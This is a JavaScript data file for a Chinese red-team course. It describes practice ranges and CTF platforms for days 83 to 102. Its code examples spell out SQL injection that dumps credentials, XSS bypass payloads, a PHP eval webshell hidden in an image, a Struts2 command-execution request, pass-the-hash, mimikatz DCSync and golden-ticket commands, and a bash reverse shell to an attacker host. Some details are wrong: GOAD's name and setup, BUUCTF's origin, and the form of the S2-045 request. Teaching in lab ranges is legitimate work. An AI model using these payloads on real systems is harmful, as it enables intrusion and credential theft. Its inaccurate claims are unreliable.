【全书知识点回顾】
• 真实案例篇：8个真实护网案例
• 入门篇：红队概念、基础概念、环境搭建、信息收集
• 基础篇：SQL注入、XSS、文件上传
• 进阶篇：命令执行、文件包含、CSRF、SSRF、逻辑漏洞
• 高级篇：MSF、提权、内网渗透、域渗透
• 大神篇：Cobalt Strike、免杀、社工、红队作战

【综合测试】
1. 红队的主要任务是什么？
2. SQL注入的原理和分类是什么？
3. 横向移动的常见方法有哪些？
4. 域渗透的常用攻击方法有哪些？
5. 免杀技术的原理和方法是什么？

【实操练习】
• 在靶场环境中完成完整攻击链
• 练习红队作战流程

全书学习结束，准备进入靶场实战篇！`;
days[83].keyPoints = ['知识回顾', '综合测试', '实操练习'];

days[84].title = '靶场系列总览';
days[84].subtitle = 'Target Practice Overview';
days[84].objectives = ['了解靶场系列内容', '制定靶场学习计划', '准备靶场环境'];
days[84].content = `靶场实战篇带你在真实环境中练习渗透测试技术。

【靶场系列内容】
• Day85-92：Web靶场（DVWA、SQLi-Labs、XSS-Challenges、Upload-Labs、WebGoat、bWAPP、Pikachu、其他）
• Day93-97：漏洞靶场（Vulhub、VulnStack、红日靶场、Boot-to-Root、其他内网靶场）
• Day98-100：域环境靶场（从零搭建域环境、GOAD、DetectionLab）
• Day101-104：CTF平台（CTFHub、BUUCTF、攻防世界、护网模拟靶场）
• Day105-109：企业级靶场（CyberRange、企业级靶场搭建、学习路径推荐、工具汇总、FAQ）

【学习目标】
• 掌握Web漏洞实战利用
• 学会内网渗透实战技巧
• 掌握域渗透实战方法
• 了解CTF解题思路

【学习建议】
• 先从Web靶场开始，打好基础
• 再进入内网靶场，练习横向移动
• 最后挑战域环境靶场
• 多做CTF，提高解题能力

靶场实战是检验学习成果的最佳方式！`;
days[84].keyPoints = ['靶场系列内容', '学习目标', '学习建议'];
days[84].resources = [
  { name: 'Web安全靶场汇总', url: 'https://www.freebuf.com/articles/web/289012.html', type: 'article' },
];

days[85].title = '靶场1：DVWA';
days[85].subtitle = 'Damn Vulnerable Web Application';
days[85].objectives = ['熟练掌握DVWA靶场使用', '练习SQL注入、XSS、文件上传等漏洞', '学会不同安全级别的绕过'];
days[85].content = `DVWA（Damn Vulnerable Web Application）是最经典的Web漏洞练习平台。

【DVWA简介】
• 包含多种Web漏洞：SQL注入、XSS、CSRF、文件上传、命令执行等
• 三种安全级别：Low、Medium、High
• 适合初学者练习基础漏洞

【DVWA安装】
• Docker方式：docker run -d -p 8081:80 vulnerables/web-dvwa
• 手动安装：下载源码，配置数据库

【DVWA模块】
• Brute Force：暴力破解
• Command Injection：命令注入
• CSRF：跨站请求伪造
• File Inclusion：文件包含
• File Upload：文件上传
• Insecure CAPTCHA：不安全的验证码
• SQL Injection：SQL注入
• SQL Injection (Blind)：SQL盲注
• XSS (Reflected)：反射型XSS
• XSS (Stored)：存储型XSS
• Weak Session IDs：弱会话ID
• CSP Bypass：CSP绕过

【实战技巧】
• 从Low级别开始，逐步提高难度
• 记录每个漏洞的利用方法
• 尝试不同的绕过技巧

DVWA是Web安全入门的最佳靶场！`;
days[85].keyPoints = ['DVWA简介', '安装方法', '模块内容', '实战技巧'];
days[85].codeExamples = [{ title: 'DVWA SQL注入Low级别', language: 'sql', code: '-- 1. 判断注入点\n?id=1\'\n?id=1 AND 1=1\n?id=1 AND 1=2\n\n-- 2. 判断字段数\n?id=1 ORDER BY 3--\n\n-- 3. 判断显示位\n?id=1 UNION SELECT 1,2,3--\n\n-- 4. 获取数据库名\n?id=1 UNION SELECT 1,database(),3--\n\n-- 5. 获取表名\n?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=\'dvwa\'--\n\n-- 6. 获取列名\n?id=1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=\'users\'--\n\n-- 7. 获取数据\n?id=1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--', explanation: 'DVWA SQL注入Low级别完整利用流程' }];
days[85].labEnvironment = [{ name: 'DVWA靶场', description: 'Web漏洞练习平台', url: 'http://localhost:8081', type: 'docker', setup: '1. 安装Docker\n2. 运行命令: docker run -d -p 8081:80 vulnerables/web-dvwa\n3. 访问 http://localhost:8081\n4. 登录账号: admin/password\n5. 设置安全级别为Low开始练习', expectedOutput: '成功进入DVWA平台，可进行SQL注入、XSS、CSRF等漏洞练习' }];
days[85].resources = [
  { name: 'DVWA官方文档', url: 'https://dvwa.co.uk/', type: 'article' },
  { name: 'DVWA视频教程', url: 'https://www.bilibili.com/video/BV1Bt411o7cE', type: 'video' },
];
days[85].quiz = [
  { type: 'single', question: 'DVWA有几种安全级别？', options: ['A. 1种', 'B. 2种', 'C. 3种', 'D. 4种'], correctIndex: 2, explanation: 'DVWA有Low、Medium、High三种安全级别。' },
];

days[86].title = '靶场2：SQLi-Labs';
days[86].subtitle = 'SQL Injection Labs';
days[86].objectives = ['掌握SQL注入各种类型', '练习手动注入技巧', '学会不同数据库的注入'];
days[86].content = `SQLi-Labs是专门练习SQL注入的靶场，包含多种注入场景。

【SQLi-Labs简介】
• 共65个关卡，涵盖各种SQL注入类型
• 支持MySQL数据库
• 适合深入学习SQL注入

【SQLi-Labs模块】
• 基础注入（Less 1-22）：联合查询、报错注入、盲注、宽字节注入
• 进阶注入（Less 23-38）：过滤绕过、堆叠注入
• 高级注入（Less 39-65）：各种复杂场景

【实战技巧】
• 从第一关开始，逐个练习
• 记录每个关卡的注入方法
• 理解不同注入类型的原理

SQLi-Labs是SQL注入学习的最佳靶场！`;
days[86].keyPoints = ['SQLi-Labs简介', '模块内容', '实战技巧'];
days[86].codeExamples = [{ title: 'SQLi-Labs Less-1联合查询', language: 'sql', code: '-- 判断注入点\n?id=1\'\n\n-- 判断字段数\n?id=1\' ORDER BY 3--+\n\n-- 判断显示位\n?id=-1\' UNION SELECT 1,2,3--+\n\n-- 获取数据库名\n?id=-1\' UNION SELECT 1,database(),3--+\n\n-- 获取表名\n?id=-1\' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+\n\n-- 获取列名\n?id=-1\' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=\'users\'--+\n\n-- 获取数据\n?id=-1\' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--+', explanation: 'SQLi-Labs第一关联合查询注入' }];
days[86].labEnvironment = [{ name: 'SQLi-Labs靶场', description: 'SQL注入练习平台', url: 'http://localhost:8082', type: 'docker', setup: '1. 安装Docker\n2. 运行命令: docker run -d -p 8082:80 acgpiano/sqli-labs\n3. 访问 http://localhost:8082\n4. 选择Less-1开始练习', expectedOutput: '成功进入SQLi-Labs平台，可进行各种SQL注入练习' }];
days[86].resources = [
  { name: 'SQLi-Labs官方仓库', url: 'https://github.com/Audi-1/sqli-labs', type: 'article' },
];

days[87].title = '靶场3：XSS-Challenges';
days[87].subtitle = 'XSS Challenges';
days[87].objectives = ['掌握XSS各种类型', '练习XSS绕过技巧', '学会XSS Payload编写'];
days[87].content = `XSS-Challenges是专门练习XSS漏洞的靶场。

【XSS-Challenges简介】
• 包含多个XSS挑战关卡
• 涵盖存储型、反射型、DOM型XSS
• 适合深入学习XSS绕过技巧

【XSS类型】
• 存储型XSS：脚本存储在服务器
• 反射型XSS：脚本通过URL传递
• DOM型XSS：脚本通过JavaScript操作DOM

【XSS绕过技巧】
• 标签绕过：<svg/onload>、<img/src>、<iframe>
• 事件绕过：onload、onerror、onclick、onmouseover
• 编码绕过：HTML编码、URL编码、Unicode编码
• 字符替换绕过：双写、大小写混合

【实战技巧】
• 尝试各种标签和事件
• 注意编码问题
• 记录有效的Payload

XSS-Challenges是XSS学习的最佳靶场！`;
days[87].keyPoints = ['XSS-Challenges简介', 'XSS类型', '绕过技巧', '实战技巧'];
days[87].codeExamples = [{ title: 'XSS Payload合集', language: 'javascript', code: '// 基础弹窗\n<script>alert(\"XSS\")</script>\n\n// 标签绕过\n<svg/onload=alert(1)>\n<img/src=x onerror=alert(1)>\n<iframe/onload=alert(1)>\n\n// 事件绕过\n<div onmouseover=alert(1)>Hover me</div>\n<input onfocus=alert(1) autofocus>\n\n// 编码绕过\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n\n// 双写绕过\n<scr<script>ipt>alert(1)</script>\n\n// 大小写混合\n<ScRiPt>alert(1)</ScRiPt>', explanation: '常用XSS Payload' }];
days[87].labEnvironment = [{ name: 'XSS-Challenges靶场', description: 'XSS练习平台', url: 'http://xss-quiz.int21h.jp/', type: 'online', setup: '1. 访问靶场网站\n2. 开始第一关\n3. 在输入框中注入XSS Payload', expectedOutput: '成功弹出alert框，完成XSS挑战' }];
days[87].resources = [
  { name: 'XSS Challenges', url: 'http://xss-quiz.int21h.jp/', type: 'article' },
];

days[88].title = '靶场4：Upload-Labs';
days[88].subtitle = 'File Upload Labs';
days[88].objectives = ['掌握文件上传漏洞', '练习文件上传绕过技巧', '学会WebShell使用'];
days[88].content = `Upload-Labs是专门练习文件上传漏洞的靶场。

【Upload-Labs简介】
• 共21个关卡，涵盖各种文件上传场景
• 适合深入学习文件上传绕过技巧

【文件上传绕过方法】
• 扩展名绕过：php→php5→phtml→.pht
• MIME类型绕过：修改Content-Type
• 路径截断：利用%00截断
• 文件内容检测绕过：图片马

【WebShell工具】
• 中国菜刀
• 蚁剑
• 冰蝎

【实战技巧】
• 先测试服务器解析规则
• 尝试各种扩展名
• 结合其他漏洞利用

Upload-Labs是文件上传学习的最佳靶场！`;
days[88].keyPoints = ['Upload-Labs简介', '绕过方法', 'WebShell', '实战技巧'];
days[88].codeExamples = [{ title: '图片马制作', language: 'bash', code: '# 方法1：copy命令\ncopy /b image.jpg + shell.php webshell.jpg\n\n# 方法2：Linux命令\ncat image.jpg shell.php > webshell.jpg\n\n# 方法3：exiftool注入\nexiftool -Comment=\'<?php @eval($_POST[\"cmd\"]); ?>\' image.jpg\n\n# .htaccess配置\n<FilesMatch "webshell.jpg">\n    SetHandler application/x-httpd-php\n</FilesMatch>', explanation: '图片马制作方法' }];
days[88].labEnvironment = [{ name: 'Upload-Labs靶场', description: '文件上传练习平台', url: 'http://localhost:8083', type: 'docker', setup: '1. 安装Docker\n2. 运行命令: docker run -d -p 8083:80 c0ny1/upload-labs\n3. 访问 http://localhost:8083\n4. 开始第一关练习', expectedOutput: '成功上传WebShell并获取服务器权限' }];
days[88].resources = [
  { name: 'Upload-Labs官方仓库', url: 'https://github.com/c0ny1/upload-labs', type: 'article' },
];

days[89].title = '靶场5：WebGoat';
days[89].subtitle = 'WebGoat';
days[89].objectives = ['掌握WebGoat靶场使用', '练习各种Web漏洞', '学会安全编码知识'];
days[89].content = `WebGoat是OWASP开发的Web安全学习平台。

【WebGoat简介】
• OWASP官方开发的Web安全学习平台
• 包含多种Web漏洞：SQL注入、XSS、CSRF、文件上传等
• 提供详细的安全编码知识

【WebGoat模块】
• 基础模块：HTTP基础、认证、访问控制
• 漏洞模块：SQL注入、XSS、CSRF、SSRF
• 高级模块：密码破解、会话管理、安全编码

【实战技巧】
• 先学习基础模块，再挑战漏洞模块
• 理解每个漏洞的原理和防御方法
• 记录学习笔记

WebGoat是学习Web安全的权威平台！`;
days[89].keyPoints = ['WebGoat简介', '模块内容', '实战技巧'];
days[89].labEnvironment = [{ name: 'WebGoat靶场', description: 'Web安全学习平台', url: 'http://localhost:8080/WebGoat', type: 'docker', setup: '1. 安装Docker\n2. 运行命令: docker run -d -p 8080:8080 webgoat/webgoat-8.0\n3. 访问 http://localhost:8080/WebGoat\n4. 注册账号开始学习', expectedOutput: '成功进入WebGoat平台，可进行各种Web安全学习' }];
days[89].resources = [
  { name: 'WebGoat官方网站', url: 'https://webgoat.github.io/WebGoat/', type: 'article' },
];

days[90].title = '靶场6：bWAPP';
days[90].subtitle = 'Buggy Web Application';
days[90].objectives = ['掌握bWAPP靶场使用', '练习各种Web漏洞', '学会不同安全级别的绕过'];
days[90].content = `bWAPP是一个包含大量漏洞的Web应用程序。

【bWAPP简介】
• 包含90多个漏洞
• 支持三种安全级别：Low、Medium、High
• 适合全面练习Web漏洞

【bWAPP模块】
• SQL注入：各种注入类型
• XSS：存储型、反射型、DOM型
• CSRF：跨站请求伪造
• 文件上传：文件上传漏洞
• 文件包含：LFI和RFI
• 命令执行：命令注入
• SSRF：服务端请求伪造

【实战技巧】
• 从Low级别开始，逐步提高难度
• 尝试不同的绕过技巧
• 记录每个漏洞的利用方法

bWAPP是全面练习Web漏洞的优秀靶场！`;
days[90].keyPoints = ['bWAPP简介', '模块内容', '实战技巧'];
days[90].labEnvironment = [{ name: 'bWAPP靶场', description: '多漏洞练习平台', url: 'http://localhost:8084', type: 'docker', setup: '1. 安装Docker\n2. 运行命令: docker run -d -p 8084:80 raesene/bwapp\n3. 访问 http://localhost:8084\n4. 登录账号: bee/bug\n5. 设置安全级别开始练习', expectedOutput: '成功进入bWAPP平台，可进行各种Web漏洞练习' }];
days[90].resources = [
  { name: 'bWAPP官方网站', url: 'http://www.itsecgames.com/', type: 'article' },
];

days[91].title = '靶场7：Pikachu';
days[91].subtitle = 'Pikachu Vulnerability Platform';
days[91].objectives = ['掌握Pikachu靶场使用', '练习各种Web漏洞', '学会漏洞原理和利用'];
days[91].content = `Pikachu是一个专门为Web安全学习设计的靶场。

【Pikachu简介】
• 中文界面，适合国内用户
• 包含多种Web漏洞
• 提供详细的漏洞原理说明

【Pikachu模块】
• SQL注入：数字型、字符型、搜索型、xx型
• XSS：存储型、反射型、DOM型
• CSRF：GET型、POST型、Token绕过
• 文件上传：各种上传场景
• 文件包含：LFI和RFI
• 命令执行：命令注入
• SSRF：服务端请求伪造
• 越权访问：水平越权、垂直越权

【实战技巧】
• 先阅读漏洞原理说明
• 再动手练习
• 记录学习笔记

Pikachu是国内最受欢迎的Web安全学习靶场！`;
days[91].keyPoints = ['Pikachu简介', '模块内容', '实战技巧'];
days[91].labEnvironment = [{ name: 'Pikachu靶场', description: '中文Web安全学习平台', url: 'http://localhost:8085', type: 'docker', setup: '1. 安装Docker\n2. 运行命令: docker run -d -p 8085:80 area1987/pikachu\n3. 访问 http://localhost:8085\n4. 开始练习', expectedOutput: '成功进入Pikachu平台，可进行各种Web漏洞练习' }];
days[91].resources = [
  { name: 'Pikachu官方仓库', url: 'https://github.com/zhuifengshaonianhanlu/pikachu', type: 'article' },
];

days[92].title = '靶场8：其他Web靶场';
days[92].subtitle = 'Other Web Targets';
days[92].objectives = ['了解其他Web靶场', '学会选择合适的靶场', '掌握靶场学习方法'];
days[92].content = `除了主流靶场，还有许多其他优秀的Web安全靶场。

【其他Web靶场】
• Mutillidae：OWASP开发的多漏洞靶场
• Juice Shop：OWASP开发的现代Web应用靶场
• DVWA-Advanced：DVWA的高级版本
• Security Shepherd：OWASP开发的安全学习平台
• OWASP Broken Web Applications Project：OWASP漏洞Web应用项目

【靶场选择建议】
• 初学者：从DVWA、Pikachu开始
• 进阶学习者：尝试SQLi-Labs、Upload-Labs
• 高级学习者：挑战WebGoat、Juice Shop

【靶场学习方法】
• 先理解漏洞原理
• 再动手练习
• 记录学习笔记
• 总结经验教训

选择合适的靶场，高效学习Web安全！`;
days[92].keyPoints = ['其他靶场', '选择建议', '学习方法'];
days[92].resources = [
  { name: 'OWASP靶场汇总', url: 'https://owasp.org/www-project-vulnerable-web-applications-directory/', type: 'article' },
];

days[93].title = '靶场9：Vulhub';
days[93].subtitle = 'Vulnerability Hub';
days[93].objectives = ['掌握Vulhub靶场使用', '练习真实漏洞利用', '学会Docker环境搭建'];
days[93].content = `Vulhub是一个基于Docker的漏洞环境集合。

【Vulhub简介】
• 包含数百个漏洞环境
• 基于Docker一键搭建
• 适合练习真实漏洞利用

【Vulhub使用方法】
• 克隆仓库：git clone https://github.com/vulhub/vulhub.git
• 进入漏洞目录：cd vulhub/<漏洞名>
• 启动环境：docker-compose up -d
• 测试漏洞：访问目标地址
• 关闭环境：docker-compose down

【常用漏洞环境】
• Struts2漏洞：struts2/
• Spring漏洞：spring/
• WordPress漏洞：wordpress/
• Tomcat漏洞：tomcat/
• Redis漏洞：redis/

【实战技巧】
• 先阅读漏洞说明文档
• 理解漏洞原理
• 再动手利用

Vulhub是练习真实漏洞的最佳平台！`;
days[93].keyPoints = ['Vulhub简介', '使用方法', '常用漏洞', '实战技巧'];
days[93].codeExamples = [{ title: 'Vulhub使用命令', language: 'bash', code: '# 克隆仓库\ngit clone https://github.com/vulhub/vulhub.git\n\n# 进入漏洞目录\ncd vulhub/struts2/s2-045\n\n# 启动环境\ndocker-compose up -d\n\n# 查看容器状态\ndocker-compose ps\n\n# 测试漏洞\ncurl -X POST http://localhost:8080/struts2-showcase/index.action -d \"name=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#context[\\\"xwork.MethodAccessor.denyMethodExecution\\\"]=false).(@java.lang.Runtime@getRuntime().exec(\\\"whoami\\\"))}\"\n\n# 关闭环境\ndocker-compose down', explanation: 'Vulhub漏洞环境使用方法' }];
days[93].labEnvironment = [{ name: 'Vulhub漏洞环境', description: '真实漏洞练习平台', url: 'https://github.com/vulhub/vulhub', type: 'local', setup: '1. 安装Docker和docker-compose\n2. 克隆Vulhub仓库\n3. 进入漏洞目录\n4. 运行docker-compose up -d启动环境\n5. 测试漏洞', expectedOutput: '成功启动漏洞环境并完成漏洞利用' }];
days[93].resources = [
  { name: 'Vulhub官方仓库', url: 'https://github.com/vulhub/vulhub', type: 'article' },
];

days[94].title = '靶场10：VulnStack';
days[94].subtitle = 'Vulnerability Stack';
days[94].objectives = ['掌握VulnStack靶场使用', '练习内网渗透', '学会完整攻击链'];
days[94].content = `VulnStack是一个模拟真实企业内网环境的靶场。

【VulnStack简介】
• 模拟真实企业内网环境
• 包含多台主机
• 适合练习完整攻击链

【VulnStack环境】
• 外网Web服务器：Web漏洞入口
• 内网服务器：内网渗透目标
• 域控制器：域渗透目标

【攻击链示例】
1. 外网Web漏洞获取WebShell
2. 信息收集发现内网
3. 权限提升获取系统权限
4. 内网扫描发现更多主机
5. 横向移动渗透其他主机
6. 域渗透获取域控权限

【实战技巧】
• 记录每个步骤的操作
• 理解攻击链的逻辑
• 尝试不同的攻击路径

VulnStack是练习内网渗透的优秀靶场！`;
days[94].keyPoints = ['VulnStack简介', '环境结构', '攻击链', '实战技巧'];
days[94].codeExamples = [{ title: '内网渗透命令', language: 'bash', code: '# 内网信息收集\nipconfig /all\nnetstat -ano\nnet view\narp -a\n\n# 权限提升\n.\WinPEASany.exe\n.\PowerUp.ps1\nInvoke-AllChecks\n\n# 横向移动\ncrackmapexec smb 192.168.1.0/24 -u administrator -H hash\npsexec \\\\192.168.1.100 -u administrator -p password cmd.exe\n\n# 域渗透\nnet user /domain\nnet group \"Domain Admins\" /domain\nmimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:domain.com /user:krbtgt\" exit', explanation: '内网渗透常用命令' }];
days[94].resources = [
  { name: 'VulnStack靶场', url: 'https://www.vulnstack.com/', type: 'article' },
];

days[95].title = '靶场11：红日靶场';
days[95].subtitle = 'Red Sun Target';
days[95].objectives = ['掌握红日靶场使用', '练习内网渗透', '学会域渗透技术'];
days[95].content = `红日靶场是一个模拟真实企业域环境的靶场。

【红日靶场简介】
• 模拟真实企业域环境
• 包含多个靶场系列（vulnstack）
• 适合练习域渗透技术

【红日靶场环境】
• vulnstack1：基础域环境
• vulnstack2：进阶域环境
• vulnstack3：高级域环境

【域渗透技术】
• 信息收集：AD信息收集、用户枚举
• 凭证窃取：Mimikatz、哈希传递
• 横向移动：SMB、RDP、WinRM
• 域控攻击：黄金票据、DCSync

【实战技巧】
• 先收集域信息
• 再执行攻击
• 注意操作隐蔽性

红日靶场是练习域渗透的最佳平台！`;
days[95].keyPoints = ['红日靶场简介', '环境结构', '域渗透技术', '实战技巧'];
days[95].resources = [
  { name: '红日安全团队', url: 'https://redteam.today/', type: 'article' },
];

days[96].title = '靶场12：Boot-to-Root';
days[96].subtitle = 'Boot to Root Challenges';
days[96].objectives = ['掌握Boot-to-Root靶场', '练习完整攻击链', '学会从入侵到提权'];
days[96].content = `Boot-to-Root靶场是一种从入侵到获取root权限的挑战。

【Boot-to-Root简介】
• 从外网入侵开始
• 逐步获取权限
• 最终目标是获取root权限

【攻击流程】
1. 信息收集：端口扫描、服务识别
2. 漏洞发现：发现可利用的漏洞
3. 漏洞利用：获取初始访问权限
4. 权限提升：从普通用户提升到root
5. 目标达成：获取root权限

【常用技术】
• 端口扫描：Nmap
• 漏洞扫描：Nikto、Nessus
• 漏洞利用：Metasploit
• 权限提升：LinPEAS、内核漏洞

【实战技巧】
• 系统地进行信息收集
• 尝试各种漏洞利用方法
• 耐心寻找提权机会

Boot-to-Root是检验渗透测试能力的最佳方式！`;
days[96].keyPoints = ['Boot-to-Root简介', '攻击流程', '常用技术', '实战技巧'];
days[96].codeExamples = [{ title: 'Boot-to-Root步骤', language: 'bash', code: '# 1. 端口扫描\nnmap -sS -sV -A 192.168.1.100\n\n# 2. 服务识别\nnmap -sV 192.168.1.100\n\n# 3. 漏洞扫描\nnikto -h http://192.168.1.100\n\n# 4. 漏洞利用\nmsfconsole\nsearch <漏洞名>\nuse <漏洞模块>\nset RHOSTS 192.168.1.100\nset LHOST 192.168.1.101\nexploit\n\n# 5. 权限提升\n./linpeas.sh\nfind / -perm -u=s -type f 2>/dev/null\n# 利用SUID文件或内核漏洞提权', explanation: 'Boot-to-Root完整步骤' }];
days[96].resources = [
  { name: 'Hack The Box', url: 'https://www.hackthebox.com/', type: 'article' },
  { name: 'TryHackMe', url: 'https://tryhackme.com/', type: 'article' },
];

days[97].title = '靶场13：其他内网靶场';
days[97].subtitle = 'Other Internal Network Targets';
days[97].objectives = ['了解其他内网靶场', '学会选择合适的靶场', '掌握内网渗透方法'];
days[97].content = `除了主流内网靶场，还有许多其他优秀的内网渗透靶场。

【其他内网靶场】
• Hack The Box：在线渗透测试平台
• TryHackMe：在线学习平台
• Offensive Security Proving Grounds：OSCP备考平台
• PenTesterLab：Web和内网渗透练习
• Vulhub内网系列：基于Docker的内网环境

【靶场选择建议】
• 初学者：从TryHackMe开始
• 进阶学习者：尝试Hack The Box
• 备考OSCP：使用Proving Grounds

【内网渗透方法】
• 信息收集：收集内网拓扑、主机信息
• 权限提升：获取更高权限
• 横向移动：渗透其他主机
• 域渗透：获取域控权限

选择合适的靶场，高效学习内网渗透！`;
days[97].keyPoints = ['其他靶场', '选择建议', '内网渗透方法'];
days[97].resources = [
  { name: 'Hack The Box', url: 'https://www.hackthebox.com/', type: 'article' },
  { name: 'TryHackMe', url: 'https://tryhackme.com/', type: 'article' },
];

days[98].title = '靶场14：从零搭建域环境';
days[98].subtitle = 'Build Domain Environment from Scratch';
days[98].objectives = ['学会搭建Windows域环境', '掌握域环境配置', '了解域环境结构'];
days[98].content = `搭建自己的域环境是学习域渗透的最佳方式。

【域环境搭建步骤】
1. 准备虚拟机：Windows Server 2016/2019
2. 安装Active Directory：提升为域控制器
3. 创建域：配置域名
4. 添加域用户：创建用户和组
5. 添加域计算机：将Windows客户端加入域

【域环境配置】
• DNS配置：配置域名解析
• DHCP配置：配置IP地址分配
• 组策略配置：配置域策略
• 证书服务配置：配置CA

【域环境结构】
• 域控制器（DC）：存储AD数据库
• 域成员服务器：提供各种服务
• 域客户端：用户使用的计算机
• 组织单元（OU）：管理分组

【实战技巧】
• 记录每一步的配置
• 理解域环境的工作原理
• 练习域渗透攻击

搭建自己的域环境，深入学习域渗透！`;
days[98].keyPoints = ['搭建步骤', '域环境配置', '域环境结构', '实战技巧'];
days[98].codeExamples = [{ title: '域环境搭建命令', language: 'powershell', code: '# 安装Active Directory域服务\nInstall-WindowsFeature AD-Domain-Services -IncludeManagementTools\n\n# 提升为域控制器\nInstall-ADDSForest -DomainName \"domain.com\" -InstallDNS -CreateDnsDelegation:$false -DatabasePath \"C:\\Windows\\NTDS\" -LogPath \"C:\\Windows\\NTDS\" -SysvolPath \"C:\\Windows\\SYSVOL\" -Force:$true\n\n# 创建域用户\nNew-ADUser -Name \"user01\" -AccountPassword (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force) -Enabled $true\n\n# 创建域组\nNew-ADGroup -Name \"SecurityGroup\" -GroupScope Global\n\n# 添加用户到组\nAdd-ADGroupMember -Identity \"SecurityGroup\" -Members \"user01\"', explanation: 'PowerShell搭建域环境命令' }];
days[98].resources = [
  { name: 'Windows域环境搭建教程', url: 'https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/deploy/install-active-directory-domain-services--level-100-', type: 'article' },
];

days[99].title = '靶场15：GOAD';
days[99].subtitle = 'Golden OAuth Active Directory';
days[99].objectives = ['掌握GOAD靶场使用', '练习复杂域环境渗透', '学会高级域攻击技术'];
days[99].content = `GOAD是一个复杂的Active Directory实验室环境。

【GOAD简介】
• 基于Docker的复杂域环境
• 包含多个域控制器
• 支持多种域攻击技术

【GOAD环境】
• 父域和子域
• 多个域控制器
• 各种服务和应用

【域攻击技术】
• Kerberos攻击：AS-REP Roasting、Kerberoasting
• 黄金票据和白银票据
• DCSync攻击
• 域信任关系攻击

【实战技巧】
• 使用BloodHound分析域结构
• 识别关键攻击路径
• 尝试多种攻击技术

GOAD是练习高级域渗透的最佳平台！`;
days[99].keyPoints = ['GOAD简介', '环境结构', '域攻击技术', '实战技巧'];
days[99].codeExamples = [{ title: 'GOAD环境使用', language: 'bash', code: '# 克隆GOAD仓库\ngit clone https://github.com/Orange-Cyberdefense/GOAD.git\n\n# 启动环境\ncd GOAD\ndocker-compose up -d\n\n# BloodHound收集\nSharpHound.exe -c All\nBloodHound.exe\n\n# Kerberoasting\nRubeus.exe kerberoast\n\n# Golden Ticket\nmimikatz.exe \"kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:hash /user:administrator /ptt\" exit\n\n# DCSync\nmimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:domain.com /user:krbtgt\" exit', explanation: 'GOAD域环境使用方法' }];
days[99].resources = [
  { name: 'GOAD官方仓库', url: 'https://github.com/Orange-Cyberdefense/GOAD', type: 'article' },
];

days[100].title = '靶场16：DetectionLab';
days[100].subtitle = 'Detection Lab';
days[100].objectives = ['掌握DetectionLab使用', '练习检测能力', '学会红蓝对抗'];
days[100].content = `DetectionLab是一个用于练习安全检测能力的实验室环境。

【DetectionLab简介】
• 模拟企业安全监控环境
• 包含SIEM、EDR、日志收集等组件
• 适合练习红蓝对抗

【DetectionLab环境】
• Windows主机：作为攻击目标
• SIEM系统：安全信息和事件管理
• EDR系统：终端检测与响应
• 日志服务器：集中收集日志

【红蓝对抗练习】
• 红队：执行攻击操作
• 蓝队：检测和响应攻击
• 练习检测规则编写
• 练习威胁狩猎

【实战技巧】
• 执行各种攻击操作
• 观察日志和告警
• 编写检测规则
• 分析攻击行为

DetectionLab是练习检测能力的最佳平台！`;
days[100].keyPoints = ['DetectionLab简介', '环境结构', '红蓝对抗', '实战技巧'];
days[100].resources = [
  { name: 'DetectionLab官方仓库', url: 'https://github.com/clong/DetectionLab', type: 'article' },
];

days[101].title = 'CTF平台1：CTFHub';
days[101].subtitle = 'CTFHub Platform';
days[101].objectives = ['掌握CTFHub使用', '练习CTF解题', '学会Web漏洞利用'];
days[101].content = `CTFHub是国内知名的CTF练习平台。

【CTFHub简介】
• 包含大量CTF题目
• 涵盖Web、Pwn、Reverse、Crypto等类别
• 适合初学者入门

【CTFHub模块】
• Skill：技能树，按知识点分类
• Challenge：挑战模式，自由练习
• Match：比赛模式，限时挑战
• Rank：排行榜

【Web类别题目】
• SQL注入：各种注入类型
• XSS：存储型、反射型、DOM型
• 文件上传：文件上传漏洞
• 文件包含：LFI和RFI
• 命令执行：命令注入
• SSRF：服务端请求伪造

【实战技巧】
• 先练习Skill模块
• 理解每个题目的原理
• 记录解题思路
• 参考Writeup

CTFHub是CTF入门的最佳平台！`;
days[101].keyPoints = ['CTFHub简介', '模块内容', 'Web类别', '实战技巧'];
days[101].codeExamples = [{ title: 'CTF解题命令', language: 'bash', code: '# 查看网页源代码\ncurl http://challenge.ctfhub.com:12345/\n\n# 目录扫描\ngobuster dir -u http://challenge.ctfhub.com:12345/ -w /usr/share/wordlists/dirb/common.txt\n\n# SQL注入\nsqlmap -u \"http://challenge.ctfhub.com:12345/?id=1\" --dbs\n\n# 文件上传\ncurl -X POST -F \"file=@shell.php\" http://challenge.ctfhub.com:12345/upload.php\n\n# 反弹Shell\nnc -lvp 4444\n# 在目标执行：bash -i >& /dev/tcp/attacker_ip/4444 0>&1', explanation: 'CTF常用解题命令' }];
days[101].resources = [
  { name: 'CTFHub官方网站', url: 'https://www.ctfhub.com/', type: 'article' },
];

days[102].title = 'CTF平台2：BUUCTF';
days[102].subtitle = 'BUUCTF Platform';
days[102].objectives = ['掌握BUUCTF使用', '练习CTF解题', '学会综合漏洞利用'];
days[102].content = `BUUCTF是ByteDance举办的CTF练习平台。

【BUUCTF简介】
• 包含大量高质量CTF题目
• 涵盖Web、Pwn、Reverse、Crypto、Misc等类别
• 题目难度适中，适合进阶学习

【BUUCTF模块】
• 新手区：适合入门
• 进阶区：提高难度
• 综合区：综合挑战
• 比赛：参加CTF比赛

【Web类别题目特点】
• 综合漏洞利用：多个漏洞组合利用
• 新颖题目：创意性题目
• 真实场景：模拟真实漏洞场景

【实战技巧】
• 先从新手区开始
• 尝试不同类别的题目
• 参考Writeup学习解题思路
• 练习快速解题能力

BUUCTF是进阶CTF学习的优秀平台！`;
days[102].keyPoints = ['BUUCTF简介', '模块内容', 'Web类别特点', '实战技巧'];
days[102].resources = [
  { name: 'BUUCTF官方网站', url: 'https://buuoj.cn/', type: 'article' },
];

